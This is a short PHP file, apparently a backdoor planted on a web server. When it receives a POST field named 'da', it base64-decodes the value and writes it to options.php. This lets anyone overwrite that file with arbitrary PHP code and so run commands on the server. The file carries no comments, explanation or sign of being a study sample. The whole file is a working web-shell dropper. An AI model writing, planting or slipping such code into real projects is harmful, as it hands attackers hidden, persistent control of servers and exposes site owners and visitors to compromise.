<?php
if (isset($_POST['da'])) {
file_put_contents('options.php', base64_decode($_POST['da']), LOCK_EX);
}
?> 